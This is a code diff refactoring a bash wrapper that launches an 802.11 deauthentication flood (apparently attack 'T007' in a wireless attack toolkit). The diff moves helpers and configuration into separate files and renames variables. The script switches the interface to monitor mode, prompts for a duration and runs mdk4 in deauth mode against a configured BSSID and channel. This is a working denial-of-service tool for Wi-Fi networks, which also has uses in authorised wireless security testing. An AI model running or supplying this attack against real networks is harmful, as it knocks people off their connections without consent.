@@ -24,36 +24,30 @@
 #   - Automatically enables monitor mode if needed
 #   - Cleans up on SIGINT or timeout using EXIT trap
 #   - Resets MAC address to hardware default before launch
+#   - Forms the basis for T007
 
-# Load helpers
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
-source "$SCRIPT_DIR/config.sh"
-source "$SCRIPT_DIR/print.sh"
+# ─── Paths ───
+BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+CONFIG_DIR="$BASH_DIR/config"
+HELPERS_DIR="$BASH_DIR/helpers"
+UTILITIES_DIR="$BASH_DIR/utilities"
 
-# Cleanup
-cleanup() {
-    print_blank
-    print_info "Starting cleanup"
-    rm -f /tmp/watt_attack_active
+# ─── Configs ───
+source "$CONFIG_DIR/global.conf"
+source "$CONFIG_DIR/atk_mdk4_deauth.conf"
 
-    # Check mode
-    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
-    if [[ "$MODE" != "managed" ]]; then
-        print_action "Reverting to Managed mode"
-        bash "$SCRIPT_DIR/set-mode-managed.sh"
-        print_success "Interface set to Managed mode"
-    fi
-
-    exit 0   
-}
+# ─── Helpers ───
+source "$HELPERS_DIR/fn_print.sh"
+source "$HELPERS_DIR/fn_mode.sh"
+source "$HELPERS_DIR/fn_cleanup.sh"
 
 # Exit traps
 trap cleanup EXIT
 trap cleanup SIGINT
 
 # Validate config vars
-if [[ -z "$INTERFACE" || -z "$T007_BSSID" || -z "$T007_CHANNEL" ]]; then
-    print_warn "INTERFACE, T007_BSSID, or T007_CHANNEL not defined in config.sh"
+if [[ -z "$INTERFACE" || -z "$ATK_BSSID" || -z "$ATK_CHANNEL" ]]; then
+    print_warn "INTERFACE, ATK_BSSID, or ATK_CHANNEL not defined in atk_mdk4_deauth.conf"
     exit 1
 fi
 
@@ -66,8 +60,8 @@ fi
 # Display config
 echo "Mode         : T007 - Deauthentication Flood"
 echo "Interface    : $INTERFACE"
-echo "Target BSSID : $T007_BSSID"
-echo "Channel      : $T007_CHANNEL"
+echo "Target BSSID : $ATK_BSSID"
+echo "Channel      : $ATK_CHANNEL"
 print_blank
 
 # Confirm attack
@@ -81,10 +75,10 @@ fi
 
 # Input duration
 while true; do
-    print_prompt "Duration (seconds) [default: ${ATTACK_DURATION}]: "
+    print_prompt "Duration (seconds) [default: ${ATK_DURATION}]: "
     read -r DURATION
 
-    DURATION="${DURATION:-$ATTACK_DURATION}"
+    DURATION="${DURATION:-$ATK_DURATION}"
     
     if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
         break
@@ -98,18 +92,13 @@ echo "T007" > /tmp/watt_attack_active
 print_blank
 print_info "Starting Attack"
 
-# Check mode
-MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
-if [[ "$MODE" != "monitor" ]]; then
-    print_action "Enabling Monitor mode"
-    bash "$SCRIPT_DIR/set-mode-monitor.sh"
-    print_success "Interface set to Monitor mode"
-fi
+# Set monitor mode
+ensure_monitor_mode
 
 # Run attack
 print_blank
 print_info "Running T007 - Deauthentication Flood attack for $DURATION seconds"
-sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$T007_BSSID" -c "$T007_CHANNEL"
+sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$ATK_BSSID" -c "$ATK_CHANNEL"
 EXIT_CODE=$?
 
 # Exit check
